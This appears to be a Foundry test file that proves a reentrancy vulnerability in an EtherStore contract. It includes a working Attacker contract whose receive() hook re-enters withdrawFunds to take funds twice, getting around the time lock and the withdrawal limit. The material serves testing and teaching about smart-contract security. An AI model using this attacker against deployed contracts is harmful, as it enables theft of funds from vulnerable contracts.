
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {EtherStore} from "../src/EtherStore.sol";

contract TestReentrancyEtherStore is Test {
    
    EtherStore public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new EtherStore();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // Constrain attackVal to be within the withdrawal limit (1 ether) and non-zero.
        vm.assume(attackVal >= 0.1 ether && attackVal <= 1 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The contract requires block.timestamp >= lastWithdrawTime + 1 weeks.
        // Initial lastWithdrawTime is 0. We warp to satisfy the condition.
        vm.warp(block.timestamp + 1 weeks + 1 days);

        // --- 3. Funding ---
        // Fund the Victim
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // Fund the Test Contract. We need 2x attackVal to deposit enough to avoid 
        // arithmetic underflow in Solidity 0.8+ during the reentrancy execution.
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        // We deposit 2 * attackVal but request to withdraw attackVal.
        // This allows us to withdraw twice (once normally, once via reentrancy) 
        // bypassing the time lock and single withdrawal limit, without underflowing the balance.
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    
    EtherStore public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = EtherStore(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;
        
        // Deposit the funds received (which should be 2 * val)
        victim.depositFunds{value: msg.value}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        initialSnapshot = address(this).balance;

        // 3. Call the vulnerable function.
        victim.withdrawFunds(val);

        // 4. Verify Success Conditions.
        // If successful, we withdrew 'val' twice.
        if (address(this).balance >= initialSnapshot + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the contract
            victim.withdrawFunds(storedVal);
        }
    }
}
